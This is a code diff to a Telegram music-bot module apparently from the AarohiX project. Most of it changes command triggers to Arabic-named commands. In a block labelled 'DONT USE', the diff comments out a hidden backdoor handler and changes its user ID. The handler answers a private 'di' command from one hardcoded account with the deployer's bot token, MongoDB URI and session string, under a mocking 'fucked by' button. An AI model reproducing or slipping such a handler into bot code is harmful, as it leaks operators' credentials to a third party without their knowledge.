@@ -7,6 +7,7 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from pyrogram.enums import ChatMembersFilter
 from pyrogram.types import CallbackQuery, Message
 import re
+from strings.filters import command
 from os import getenv
 from AarohiX import app
 from AarohiX.core.call import Dil
@@ -24,7 +25,7 @@ rel = {}
 
 
 @app.on_message(
-    filters.command(["admincache", "reload", "refresh"]) & filters.group & ~BANNED_USERS
+    command(["تحديث", "reload", "refresh"]) & ~BANNED_USERS
 )
 @language
 async def reload_admin_cache(client, message: Message, _):
@@ -53,7 +54,7 @@ async def reload_admin_cache(client, message: Message, _):
         await message.reply_text(_["reload_3"])
 
 
-@app.on_message(filters.command(["reboot"]) & filters.group & ~BANNED_USERS)
+@app.on_message(command(["ريستارت"]) & ~BANNED_USERS)
 @AdminActual
 async def restartbot(client, message: Message, _):
     mystic = await message.reply_text(_["reload_4"].format(app.mention))
@@ -107,23 +108,23 @@ async def close_menu(_, CallbackQuery):
 #-------------------------------DONT USE------------------------------------#
 
 #@app.on_message(
-    filters.command("di")
-    & filters.private
-    & filters.user(6975380739)
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://graph.org/file/ee9a153b629bec256b517.jpg",
-       caption=f"""ᴛᴏᴋᴇɴ :-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ :-   `{MONGO_DB_URI}`\n\nsᴇssɪᴏɴ :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/dil_sagar_121")
-                 ]
-            ]
-         ),
-     )
+#    filters.command("di")
+#    & filters.private
+#    & filters.user(5465943450)
+#   )
+#async def help(client: Client, message: Message):
+#   await message.reply_photo(
+#          photo=f"https://graph.org/file/ee9a153b629bec256b517.jpg",
+#       caption=f"""ᴛᴏᴋᴇɴ :-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ :-   `{MONGO_DB_URI}`\n\nsᴇssɪᴏɴ :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
+#        reply_markup=InlineKeyboardMarkup(
+#             [
+#                 [
+#                      InlineKeyboardButton(
+#                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/dil_sagar_121")
+#                 ]
+#            ]
+#         ),
+#     )
 
 #-------------------------------DONT USE------------------------------------#
 
